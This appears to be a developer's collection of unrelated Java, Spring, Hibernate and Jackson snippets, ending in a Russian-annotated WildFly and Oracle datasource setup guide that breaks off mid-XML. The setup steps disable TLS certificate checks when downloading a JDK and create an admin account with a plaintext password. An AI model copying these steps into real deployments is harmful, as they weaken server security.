      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "email", "NotEmpty.customerForm.email");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "address", "NotEmpty.customerForm.address");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "phone", "NotEmpty.customerForm.phone");
 
      if (!emailValidator.isValid(custInfo.getEmail())) {
         errors.rejectValue("email", "Pattern.customerForm.email");
      }
   }
}

import org.o7planning.sbshoppingcart.dao.ProductDAO;
import org.o7planning.sbshoppingcart.entity.Product;
import org.o7planning.sbshoppingcart.form.ProductForm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;
 
@Component
public class ProductFormValidator implements Validator {
 
   @Autowired
   private ProductDAO productDAO;
 
   // This validator only checks for the ProductForm.
   @Override
   public boolean supports(Class<?> clazz) {
      return clazz == ProductForm.class;
   }
 
   @Override
   public void validate(Object target, Errors errors) {
      ProductForm productForm = (ProductForm) target;
 
      // Check the fields of ProductForm.
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "code", "NotEmpty.productForm.code");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "name", "NotEmpty.productForm.name");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "price", "NotEmpty.productForm.price");
 
      String code = productForm.getCode();
      if (code != null && code.length() > 0) {
         if (code.matches("\\s+")) {
            errors.rejectValue("code", "Pattern.productForm.code");
         } else if (productForm.isNewProduct()) {
            Product product = productDAO.findProduct(code);
            if (product != null) {
               errors.rejectValue("code", "Duplicate.productForm.code");
            }
         }
      }
   }
}

   @Autowired
   private ProductFormValidator productFormValidator;
 
   @InitBinder
   public void myInitBinder(WebDataBinder dataBinder) {
      Object target = dataBinder.getTarget();
      if (target == null) {
         return;
      }
      System.out.println("Target=" + target);
 
      if (target.getClass() == ProductForm.class) {
         dataBinder.setValidator(productFormValidator);
      }
   }
   
 
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;
 
public class ServletInitializer extends SpringBootServletInitializer {
 
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(SpringBootTomcatApplication.class);
    }
 
}
--------------------------------------------------------------------------------------------------------
logging.config
logging.exception-conversion-word
logging.file
logging.level.*
logging.path
logging.pattern.console
logging.pattern.file
logging.pattern.level
logging.register-shutdown-hook

yyyy-MM-dd'T'HH:mm:ss.SSSZ
--------------------------------------------------------------------------------------------------------
curl -i -H "key1:val1" -H "key2:val2" http://localhost:8080/spring-rest/ex/foos
@RequestMapping(value = "/ex/bars/{numericId:[\\d]+}", method = GET)
curl -i -d id=100 http://localhost:8080/spring-rest/ex/bars

--------------------------------------------------------------------------------------------------------
@RequestParam Map<String, String> params
   /*
    * Binding date and time URL template variable to LocalDate and LocalTime
    */
   @GetMapping("/request5/{date}/{time}")
   @ResponseBody
   public String handler(
         @DateTimeFormat(pattern = "yyyy-MM-dd") @PathVariable("date") LocalDate date,
         @DateTimeFormat(pattern = "HH:mm:ss") @PathVariable("time") LocalTime time) {

      return "URL parameters - <br>" 
            + " date = " + date + " <br>" 
            + " time = " + time;
   }
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping("/dept")
public class DeptController {

    @RequestMapping("{id:[0-9]+}")
    public String handleRequest(@PathVariable("id") String userId, Model model){
        model.addAttribute("msg", "profile id: "+userId);
        return "my-page";

    }

    @RequestMapping("{name:[a-zA-Z]+}")
    public String handleRequest2 (@PathVariable("name") String deptName, Model model) {
        model.addAttribute("msg", "dept name : " + deptName);
        return "my-page";
    }
}

mvn  clean install tomcat7:run-war
--------------------------------------------------------------------------------------------------------
# ===============================
# JPA / HIBERNATE
# ===============================
 
spring.jpa.show-sql=true
spring.jpa.hibernate.ddl-auto=update
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.SQLServer2012Dialect
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;
 
import org.springframework.boot.actuate.info.Info;
import org.springframework.boot.actuate.info.InfoContributor;
import org.springframework.stereotype.Component;
 
  
 
@Component
public class BuildInfoContributor implements InfoContributor {
     
    @Override
    public void contribute(Info.Builder builder) {
        Map<String,String> data= new HashMap<String,String>();
        data.put("build.version", "2.0.0.M7");
        builder.withDetail("buildInfo", data);
    }
     
}
--------------------------------------------------------------------------------------------------------
import com.gpch.login.model.User;
import com.gpch.login.repository.RoleRepository;
import com.gpch.login.repository.UserRepository;
import org.junit.Before;
import org.junit.Test;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

import static org.junit.Assert.assertEquals;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.MockitoAnnotations.initMocks;

public class UserServiceTest {

    @Mock
    private UserRepository mockUserRepository;
    @Mock
    private RoleRepository mockRoleRepository;
    @Mock
    private BCryptPasswordEncoder mockBCryptPasswordEncoder;

    private UserService userServiceUnderTest;
    private User user;

    @Before
    public void setUp() {
        initMocks(this);
        userServiceUnderTest = new UserService(mockUserRepository,
                                               mockRoleRepository,
                                               mockBCryptPasswordEncoder);
        user = User.builder()
                .id(1)
                .name("Gustavo")
                .lastName("Ponce")
                .email("test@test.com")
                .build();

        Mockito.when(mockUserRepository.save(any()))
                .thenReturn(user);
        Mockito.when(mockUserRepository.findByEmail(anyString()))
                .thenReturn(user);
    }

    @Test
    public void testFindUserByEmail() {
        // Setup
        final String email = "test@test.com";

        // Run the test
        final User result = userServiceUnderTest.findUserByEmail(email);

        // Verify the results
        assertEquals(email, result.getEmail());
    }

    @Test
    public void testSaveUser() {
        // Setup
        final String email = "test@test.com";

        // Run the test
        User result = userServiceUnderTest.saveUser(User.builder().build());

        // Verify the results
        assertEquals(email, result.getEmail());
    }
}
--------------------------------------------------------------------------------------------------------


@Converter
public class PeriodStringConverter
        implements AttributeConverter<Period, String> {

    @Override
    public String convertToDatabaseColumn(Period attribute) {
        return attribute.toString();
    }

    @Override
    public Period convertToEntityAttribute(String dbData) {
        return Period.parse( dbData );
    }
}





@Entity(name = "Event")
public static class Event {

    @Id
    @GeneratedValue
    private Long id;

    @Convert(converter = PeriodStringConverter.class)
    @Column(columnDefinition = "")
    private Period span;

    //Getters and setters are omitted for brevity

}


--------------------------------------------------------------------------------------------------------
@Service
public class StudentCustomRepositoryServiceImpl implements StudentCustomRepository {

     @PersistenceContext
     private EntityManager em;

     @Override
     public void anyCustomMethod(){
         //here use the entityManager
     }

     @Override
     StudentEntity getStudentByName(String name){
         Criteria crit = em.unwrap(Session.class).createCriteria(StudentEntity.class);
         crit.add(Restrictions.eq("name", name));
         List<StudentEntity> students = crit.list();
         return students.get(0);
     }
 }
--------------------------------------------------------------------------------------------------------
 
import java.util.List;
 
import org.hibernate.SessionFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
 
import com.howtodoinjava.entity.EmployeeEntity;
 
@Repository
public class EmployeeDaoImpl implements EmployeeDAO
{
    @Autowired
    private SessionFactory sessionFactory;
    @Override
    public void addEmployee(EmployeeEntity employee) {
        this.sessionFactory.getCurrentSession().save(employee);
    }
    @SuppressWarnings("unchecked")
    @Override
    public List<EmployeeEntity> getAllEmployees() {
        return this.sessionFactory.getCurrentSession().createQuery("from EmployeeEntity").list();
    }
    @Override
    public void deleteEmployee(Integer employeeId) {
        EmployeeEntity employee = (EmployeeEntity) sessionFactory.getCurrentSession().load(
                EmployeeEntity.class, employeeId);
        if (null != employee) {
            this.sessionFactory.getCurrentSession().delete(employee);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonIgnore;
import com.paragon.microservices.distributor.model.constraint.ChronologicalDates;
import com.paragon.microservices.distributor.model.converter.AuthenticatedUserConverter;
import com.paragon.microservices.distributor.model.domain.AuthenticatedUser;
import com.paragon.microservices.distributor.system.utils.AuthenticationUtils;
import io.swagger.annotations.ApiModelProperty;
import lombok.AllArgsConstructor;
import lombok.NoArgsConstructor;
import lombok.Setter;
import lombok.experimental.UtilityClass;
import org.hibernate.Session;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.UpdateTimestamp;
import org.hibernate.tuple.ValueGenerator;
import org.springframework.data.annotation.CreatedBy;
import org.springframework.data.annotation.LastModifiedBy;
import org.springframework.data.domain.Auditable;
import org.springframework.data.jpa.domain.support.AuditingEntityListener;
import org.springframework.format.annotation.DateTimeFormat;

import javax.persistence.*;
import javax.validation.constraints.NotNull;
import java.io.Serializable;
import java.time.LocalDateTime;
import java.util.Objects;
import java.util.Optional;

import static com.paragon.microservices.distributor.model.entity.AuditModelEntity.AuditModelPersistable.*;
import static com.paragon.microservices.distributor.system.utils.DateUtils.DEFAULT_DATE_FORMAT_PATTERN_EXT;

/**
 * {@link AuditModelPersistable} entity
 *
 * @param <ID> type of model identifier {@link Serializable}
 */
@AllArgsConstructor
@NoArgsConstructor
@DynamicInsert
@DynamicUpdate
@MappedSuperclass
@ChronologicalDates
@EntityListeners(AuditingEntityListener.class)
@Converts({
        @Convert(attributeName = "createdBy", converter = AuthenticatedUserConverter.class),
        @Convert(attributeName = "lastModifiedBy", converter = AuthenticatedUserConverter.class)
})
public abstract class AuditModelEntity<ID extends Serializable> implements Auditable<AuthenticatedUser, ID, LocalDateTime>, Serializable {
    /**
     * Default explicit serialVersionUID for interoperability
     */
    private static final long serialVersionUID = 431774856692738135L;

    @Setter
    @CreationTimestamp
    @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME, pattern = DEFAULT_DATE_FORMAT_PATTERN_EXT)
    @NotNull(message = "{model.entity.audit.created-date.notNull}")
    @Column(name = CREATED_FIELD_NAME, nullable = false, updatable = false)
    private LocalDateTime createdDate;

    @Setter
    @CreatedBy
    @Basic(fetch = FetchType.LAZY)
    @NotNull(message = "{model.entity.audit.created-by.notNull}")
    @Column(name = CREATED_BY_FIELD_NAME, nullable = false, updatable = false, length = 512)
    //@GeneratorType( type = AuthenticationUserGenerator.class, when = GenerationTime.INSERT)
    private AuthenticatedUser createdBy;

    @Setter
    @UpdateTimestamp
    @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME, pattern = DEFAULT_DATE_FORMAT_PATTERN_EXT)
    @Column(name = MODIFIED_FIELD_NAME, insertable = false)
    //@GeneratorType( type = AuthenticationUserGenerator.class, when = GenerationTime.ALWAYS)
    private LocalDateTime lastModifiedDate;

    @Setter
    @LastModifiedBy
    @Basic(fetch = FetchType.LAZY)
    @Column(name = MODIFIED_BY_FIELD_NAME, insertable = false, length = 512)
    private AuthenticatedUser lastModifiedBy;

    @Override
    public Optional<LocalDateTime> getCreatedDate() {
        return Optional.ofNullable(this.createdDate);
    }

    @Override
    public Optional<AuthenticatedUser> getCreatedBy() {
        return Optional.ofNullable(this.createdBy);
    }

    @Override
    public Optional<LocalDateTime> getLastModifiedDate() {
        return Optional.ofNullable(this.lastModifiedDate);
    }

    @Override
    public Optional<AuthenticatedUser> getLastModifiedBy() {
        return Optional.ofNullable(this.lastModifiedBy);
    }

    @PrePersist
    protected void onCreate() {
        AuthenticationUtils.getAuthenticatedUser().ifPresent(this::setCreatedBy);
    }

    @PreUpdate
    protected void onUpdate() {
        AuthenticationUtils.getAuthenticatedUser().ifPresent(this::setLastModifiedBy);
    }

    @ApiModelProperty(hidden = true)
    @JsonIgnore
    @Override
    public boolean isNew() {
        return Objects.isNull(this.getId());
    }

    @UtilityClass
    public static final class AuditModelPersistable {
        public static final String CREATED_FIELD_NAME = "created";
        public static final String MODIFIED_FIELD_NAME = "modified";
        public static final String CREATED_BY_FIELD_NAME = "created_by";
        public static final String MODIFIED_BY_FIELD_NAME = "modified_by";
    }


    public static class AuthenticationUserGenerator implements ValueGenerator<AuthenticatedUser> {
        @Override
        public AuthenticatedUser generateValue(final Session session, final Object owner) {
            return AuthenticationUtils.getAuthenticatedUser().orElse(null);
        }
    }
}


java.util.concurrent.CompletionException: org.springframework.dao.DataIntegrityViolationException: could not initialize a collection batch:
--------------------------------------------------------------------------------------------------------
import com.paragon.microservices.distributor.model.entity.BaseAuditableEntity;
import org.springframework.data.repository.NoRepositoryBean;

import java.io.Serializable;

/**
 * {@link BaseAuditableEntity} repository declaration
 *
 * @param <E>  type of persistable {@link BaseAuditableEntity}
 * @param <ID> type of persistable {@link BaseAuditableEntity} identifier {@link Serializable}
 */
@NoRepositoryBean
public interface BaseRepository<E extends BaseAuditableEntity<ID>, ID extends Serializable> extends BaseJpaRepository<E, ID> {
}

--------------------------------------------------------------------------------------------------------
    @Override
    public <E extends Persistable<ID>> void saveOrUpdate(final E target, final Class<? extends E> entityClass) {
        log.info("Saving or updating target entity: {}, class: {}", target, entityClass);
        if (target.isNew()) {
            this.getEntityManager().persist(target);
        } else {
            final E targetEntity = this.getEntityManager().find(entityClass, target.getId());
            OptionalConsumer.of(targetEntity)
                    .ifPresent(e -> this.getEntityManager().merge(e))
                    .ifNotPresent(() -> this.getEntityManager().persist(target));
        }
    }
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.stream.Collectors;

import com.baeldung.jackson.entities.ActorJackson;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

public class ActorJacksonSerializer extends StdSerializer<ActorJackson> {

    private SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");

    public ActorJacksonSerializer(Class t) {
        super(t);
    }

    @Override
    public void serialize(ActorJackson actor, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {

        jsonGenerator.writeStartObject();
        jsonGenerator.writeStringField("imdbId", actor.getImdbId());
        jsonGenerator.writeObjectField("dateOfBirth", actor.getDateOfBirth() != null ? sdf.format(actor.getDateOfBirth()) : null);
        jsonGenerator.writeNumberField("N° Film: ", actor.getFilmography() != null ? actor.getFilmography()
            .size() : null);
        jsonGenerator.writeStringField("filmography", actor.getFilmography()
            .stream()
            .collect(Collectors.joining("-")));
        jsonGenerator.writeEndObject();
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;

import com.baeldung.jackson.enums.Distance;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

public class DistanceSerializer extends StdSerializer<Distance> {

    private static final long serialVersionUID = 1376504304439963619L;

    public DistanceSerializer() {
        super(Distance.class);
    }

    public DistanceSerializer(Class<Distance> t) {
        super(t);
    }

    public void serialize(Distance distance, JsonGenerator generator, SerializerProvider provider) throws IOException, JsonProcessingException {
        generator.writeStartObject();
        generator.writeFieldName("name");
        generator.writeString(distance.name());
        generator.writeFieldName("unit");
        generator.writeString(distance.getUnit());
        generator.writeFieldName("meters");
        generator.writeNumber(distance.getMeters());
        generator.writeEndObject();
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;

import com.baeldung.jackson.entities.MyPair;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.KeyDeserializer;

public class MyPairDeserializer extends KeyDeserializer {

    @Override
    public MyPair deserializeKey(String key, DeserializationContext ctxt) throws IOException, JsonProcessingException {

        return new MyPair(key);
    }
}
--------------------------------------------------------------------------------------------------------
public CompletableFuture<Person> get(String id) {
    // When creating future manually, it's important to include try/catch blocks.
    // This is because when an exception is thrown, we want to wrap it in a failed future.
    try {
        // cache is a simple Map<String, Person>.
        Person cached = cache.get(id);
        // If we have the object cached, simply wrap and return it.
        if (cached != null) {
            return CompletableFuture.completedFuture(cached);
        }
        // Object was not cached, create CompletableFuture to represent its future availability.
        CompletableFuture<Person> future = new CompletableFuture<>();
        // Code to fetch the Person here.
        // This example uses a legacy callback class as an example, but it could be any type of asynchronous code.
        databaseFetch(id, person -> {
            // Cache the person. (this step is specific to this example, included for completeness)
            cache.put(id, person);
            // Send the result to the future.
            future.complete(person);
        });
        // Return the future.
        return future;
    }
    // Wrap all errors in a failed future.
    catch (Throwable e) {
        // If errors happen, we use completeExceptionally() to report them.
        // The get() method itself should not throw any exceptions.
        CompletableFuture<Person> future = new CompletableFuture<>();
        future.completeExceptionally(e);
        return future;
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.StringWriter;

import com.baeldung.jackson.entities.MyPair;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;

public class MyPairSerializer extends JsonSerializer<MyPair> {

    private final ObjectMapper mapper = new ObjectMapper();

    @Override
    public void serialize(MyPair value, JsonGenerator gen, SerializerProvider serializers) throws IOException, JsonProcessingException {
        StringWriter writer = new StringWriter();
        mapper.writeValue(writer, value);
        gen.writeFieldName(writer.toString());
    }
}
--------------------------------------------------------------------------------------------------------
    @JsonGetter("publications")
    public List<Item> getItems() {
        return items;
    }
	
	    @JsonAnyGetter
    public Map<String, Float> getCountryDeliveryCost() {
        return countryDeliveryCost;
    }
	
	    @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "ordertype")
    @JsonSubTypes({ @JsonSubTypes.Type(value = InternalType.class, name = "internal") })
    public static class Type {
        public long id;
        public String name;
    }

    @JsonTypeName("internal")
    public static class InternalType extends Type {
        public long id;
        public String name;
    }
	
	import com.fasterxml.jackson.annotation.JsonIgnoreType;

/**
 * Source code github.com/readlearncode
 *
 * @author Alex Theedom www.readlearncode.com
 * @version 1.0
 */
@JsonIgnoreType
public class IgnoreListMixIn {
}

@JsonAutoDetect(fieldVisibility = Visibility.ANY)
public class Order {
}
@JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd@HH:mm:ss.SSSZ")
@JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd@HH:mm:ss.SSSZ", locale = "en_GB")
@JsonFormat(shape = JsonFormat.Shape.NUMBER)

        final DateFormat formatter = new SimpleDateFormat("EEE MMM dd hh:mm:ss zzz yyyy", Locale.US);
        formatter.setTimeZone(TimeZone.getTimeZone("GMT"));
        return formatter.format(dateOfBirth);
		
import java.util.Map;

import com.baeldung.jackson.serialization.MyPairDeserializer;
import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.databind.annotation.JsonDeserialize;

public class ClassWithAMap {

    @JsonProperty("map")
    @JsonDeserialize(keyUsing = MyPairDeserializer.class)
    private final Map<MyPair, String> map;

    @JsonCreator
    public ClassWithAMap(Map<MyPair, String> map) {
        this.map = map;
    }

    public Map<MyPair, String> getMap() {
        return map;
    }
}
    @JacksonInject
    private UUID id;
	    @JsonDeserialize(using = CustomDateDeserializer.class)
    private Date published;
--------------------------------------------------------------------------------------------------------

import java.util.ArrayList;

import javax.jws.WebService;

import com.stackify.models.User;
import com.stackify.models.Users;

@WebService(endpointInterface = "com.stackify.services.UserService")
public class DefaultUserImpl implements UserService {

    ArrayList<User> usersList = new ArrayList<>();

    @Override
    public void addUser(User user) {
        usersList.add(user);
    }

    @Override
    public Users getUsers() {
        Users users = new Users();
        users.setUsers(usersList);
        return users;
    }

}
--------------------------------------------------------------------------------------------------------
#!/bin/sh

java -Dspring.profiles.active=$1 -Dlogging.config=/logback.xml -jar /app.war
--------------------------------------------------------------------------------------------------------
    @Bean
    public DataSource dataSource() {
        EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
        EmbeddedDatabase db = builder.setType(EmbeddedDatabaseType.H2).addScript("mySchema.sql").addScript("myData.sql").build();
        return db;
    }
--------------------------------------------------------------------------------------------------------
import com.stackify.debug.JavaRemoteDebuggingApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.support.SpringBootServletInitializer;

public class WebInitializer extends SpringBootServletInitializer {
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(JavaRemoteDebuggingApplication.class);
    }
}
--------------------------------------------------------------------------------------------------------
# Alpine Linux with OpenJDK JRE
FROM openjdk:8-jre-alpine
RUN apk add --no-cache bash

# copy fat WAR
COPY spring-boot-app-0.0.1-SNAPSHOT.war /app.war

# copy fat WAR
COPY logback.xml /logback.xml

COPY run.sh /run.sh

# runs application
#CMD ["/usr/bin/java", "-jar", "-Dspring.profiles.active=default", "-Dlogging.config=/logback.xml", "/app.war"]

ENTRYPOINT ["/run.sh"]

#CMD ["/usr/bin/java", "-jar", "-Dspring.profiles.active=default", "-Dlogging.config=/logback.xml", "/app.war"]
--------------------------------------------------------------------------------------------------------
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.TableGenerator;

@Entity
public class Department {
    @Id
    @GeneratedValue(strategy = GenerationType.TABLE, generator="table-generator")
    @TableGenerator (name="table-generator", table="dep_ids", pkColumnName="seq_id", valueColumnName="seq_value")
    private long depId;

    public long getDepId() {
        return depId;
    }

    public void setDepId(long depId) {
        this.depId = depId;
    }
}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Marker;

import ch.qos.logback.classic.Level;
import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.turbo.TurboFilter;
import ch.qos.logback.core.spi.FilterReply;

public class IgnoreLoggerFilter extends TurboFilter {

    private String loggerName;

    @Override
    public FilterReply decide(Marker marker, Logger logger, Level level, String format, Object[] params, Throwable t) {
        if (loggerName == null) {
            return FilterReply.NEUTRAL;
        } else if (loggerName.equals(logger.getName())) {
            return FilterReply.DENY;
        } else
            return FilterReply.NEUTRAL;
    }

    public void setLoggerName(String loggerName) {
        this.loggerName = loggerName;
    }

}
--------------------------------------------------------------------------------------------------------
import com.google.common.util.concurrent.AtomicLongMap;

public class AtomicLongMapTutorials {

    private AtomicLongMap<String> atomicLongMap;

    public AtomicLongMapTutorials() {
        atomicLongMap = AtomicLongMap.create();
    }

    public void addKeys() {
        atomicLongMap.addAndGet("apple", 250);
        atomicLongMap.addAndGet("bat", 350);
        atomicLongMap.addAndGet("cat", 450);
        atomicLongMap.addAndGet("dog", 550);
    }

    public static void main(String[] args) {
        AtomicLongMapTutorials atomicLongMapTutorials = new AtomicLongMapTutorials();
        atomicLongMapTutorials.addKeys();

        System.out.println(atomicLongMapTutorials.atomicLongMap.get("2"));
    }
}
--------------------------------------------------------------------------------------------------------
package com.baeldung.aspect;

public aspect ChangeCallsToCurrentTimeInMillisMethod {
    long around():
            call(public static native long java.lang.System.currentTimeMillis())
                    && within(user.code.base.pckg.*) {
        return 0;
    }
}
--------------------------------------------------------------------------------------------------------
redis-server --port 7777 --dbfilename test.rdb
--------------------------------------------------------------------------------------------------------
import static com.lordofthejars.nosqlunit.redis.RedisRule.RedisRuleBuilder.newRedisRule;
import static com.lordofthejars.nosqlunit.redis.ManagedRedis.ManagedRedisRuleBuilder.newManagedRedisRule;

import static org.junit.Assert.assertThat;
import static org.hamcrest.CoreMatchers.is;

import org.junit.ClassRule;
import org.junit.Rule;
import org.junit.Test;

import redis.clients.jedis.Jedis;

import com.lordofthejars.nosqlunit.annotation.UsingDataSet;
import com.lordofthejars.nosqlunit.core.LoadStrategyEnum;
import com.lordofthejars.nosqlunit.demo.model.Book;
import com.lordofthejars.nosqlunit.redis.ManagedRedis;
import com.lordofthejars.nosqlunit.redis.RedisRule;

public class WhenYouFindABook {

	static {
		System.setProperty("REDIS_HOME", "/opt/redis-2.4.17");
	}

	@ClassRule
	public static ManagedRedis managedRedis = newManagedRedisRule().build();

	@Rule
	public RedisRule redisRule = newRedisRule().defaultManagedRedis();
	
	@Test
	@UsingDataSet(locations="book.json", loadStrategy=LoadStrategyEnum.CLEAN_INSERT)
	public void book_should_be_returned_if_title_is_in_database() {
		
		BookManager bookManager = new BookManager(new Jedis("localhost"));
		Book findBook = bookManager.findBookByTitle("The Hobbit");
		
		assertThat(findBook, is(new Book("The Hobbit", 293)));
		
	}

}
--------------------------------------------------------------------------------------------------------
@Service
class RedisService {

    @Autowired
    private RedisTemplate<String, SomeClass> redisTemplate;

    SomeClass get(String key) {
        return redisTemplate.opsForValue().get(key);
    }

}

class IntegrationTest {

    @MockBean
    private RedisService redisService;

    @Before
    public void setup() {
        SomeClass someClass= new SomeClass();
        when(redisService.get(anyString())).thenReturn(someClass);
    }


}
--------------------------------------------------------------------------------------------------------
class ClassWithSafeVarargs<T> {

    @SafeVarargs
    final void iterateOverVarargs(T... args) {
        for (T x : args) {
            // do stuff with x
        }
    }
}

class ClassWithSuppressWarnings {

    @SuppressWarnings("deprecation")
    void useDeprecatedMethod() {
        ClassWithDeprecatedMethod.deprecatedMethod(); // no warning is generated here
    }
}
--------------------------------------------------------------------------------------------------------
zypper refresh
zypper install wget
--------------------------------------------------------------------------------------------------------
org.flips
stork.yml

https://www.baeldung.com/flowable
--------------------------------------------------------------------------------------------------------
wget --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie" "http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm"
rpm -ivh jdk-8u131-linux-x64.rpm

wget http://download.jboss.org/wildfly/8.2.1.Final/wildfly-8.2.1.Final.tar.gzip
wget 'https://onedrive.live.com/download?resid=C308FDFA0488C7FB!445569&authkey=!AP3V1xql-CohCTw&ithint=file%2czip'
wget 'https://onedrive.live.com/download?resid=C308FDFA0488C7FB!449995&authkey=!AJUA750qwiu6L4M&ithint=file%2czip'

deploy --force /путь к файлу/wmq.jmsra.rar

/usr/java/jdk1.8.0_131/jre/lib/security/java.security

securerandom.source=file:/dev/./urandom

useradd --system --comment "WildFly Application Server" --create-home --home /opt/wildfly --user-group wildfly

cd /opt/wildfly/wildfly-8.2.1.Final/bin/
./add-user.sh admin adminpwd --silent

jboss-cli.sh -c

https://docs.jboss.org/author/display/WFLY/Command+Line+Interface. 

module add --name=com.oracle --resources=/путь к драйверу/ojdbc7.jar --dependencies=javax.api,javax.transaction.api

/subsystem=datasources/jdbc-driver=oracle:add(driver-name="oracle",driver-module-name="com.oracle",driver-class-name=oracle.jdbc.driver.OracleDriver)
data-source add --jndi-name=java:jboss/datasources/RegisterDS --name= RegisterDS --connection-url=jdbc:oracle:thin:@<MAIN_DB_SERVER>:<MAIN_DB_PORT>/<MAIN_DB_SID> --driver-name=oracle --user-name=<MAIN_USER_NAME> --password=<MAIN_USER_PASSWORD> --enabled=true --min-pool-size=5 --max-pool-size=100 --pool-prefill=true --flush-strategy=IdleConnections --check-valid-connection-sql="select 1 from dual" --validate-on-match=false --background-validation=true --background-validation-millis=10000 --blocking-timeout-wait-millis=10000

data-source add --jndi-name=java:jboss/datasources/JMSDS --name=JMSDS --connection-url=jdbc:oracle:thin:@<QUEUE_DB_SERVER>:<QUEUE_DB_PORT>/<QUEUE_DB_SID> --driver-name=oracle --user-name=<QUEUE_USER_NAME> --password=<QUEUE_USER_PASSWORD> --enabled=true --min-pool-size=5 --max-pool-size=200 --pool-prefill=true --flush-strategy=IdleConnections --check-valid-connection-sql="select 1 from dual" --validate-on-match=false --background-validation=true --background-validation-millis=10000 --blocking-timeout-wait-millis=30000 --use-fast-fail=true 

•	MAIN_DB_SERVER – сетевое имя или ip-адрес сервера основной БД
•	MAIN_DB_PORT – номер порта сервера основной БД (стандартное значение для Oracle — 1521)
•	MAIN_DB_SID – имя сервиса основной БД или SID
•	MAIN_USER_NAME – имя пользователя основной БД
•	MAIN_USER_PASSWORD – пароль пользователя основной БД
•	QUEUE_DB_SERVER – сетевое имя или ip-адрес сервера БД очередей*
•	QUEUE_DB_PORT – номер порта сервера БД очередей (стандартное значение для Oracle — 1521)
•	QUEUE_DB_SID – имя сервиса БД очередей или SID
•	QUEUE_USER_NAME – имя пользователя БД очередей
•	QUEUE_USER_PASSWORD – пароль пользователя БД очередей

<datasource jndi-name="java:jboss/datasources/RegisterDS" pool-name="RegisterDS" enabled="true">
    <connection-url>jdbc:oracle:thin:@<MAIN_DB_SERVER>:<MAIN_DB_PORT>/<MAIN_DB_SID></connection-url>
    <driver>oracle</driver>
    <pool>
        <min-pool-size>5</min-pool-size>
        <max-pool-size>100</max-pool-size>
        <prefill>true</prefill>
    </pool>
    <security>
        <user-name><MAIN_USER_NAME></user-name>
        <password><MAIN_USER_PASSWORD></password>
    </security>
    <timeout>
        <blocking-timeout-millis>10000</blocking-timeout-millis>
    </timeout>
 <validation>
        <check-valid-connection-sql>select 1 from dual</check-valid-connection-sql>
        <validate-on-match>false</validate-on-match>
        <background-validation>true</background-validation>
        <background-validation-millis>10000</background-validation-millis>
    </validation>
</datasource>
<datasources>
<datasource jndi-name="java:jboss/datasources/JMSDS" pool-name="JMSDS" enabled="true">
    <connection-url>jdbc:oracle:thin:@<QUEUE_DB_SERVER>:<QUEUE_DB_PORT>/<QUEUE_DB_SID></connection-url>
    <driver>oracle</driver>
    <pool>
        <min-pool-size>5</min-pool-size>
        <max-pool-size>200</max-pool-size>
        <prefill>true</prefill>
        <flush-strategy>IdleConnections</flush-strategy>
    </pool>
    <security>
        <user-name><QUEUE_USER_NAME></user-name>
        <password><QUEUE_USER_PASSWORD></password>
    </security>
    <timeout>
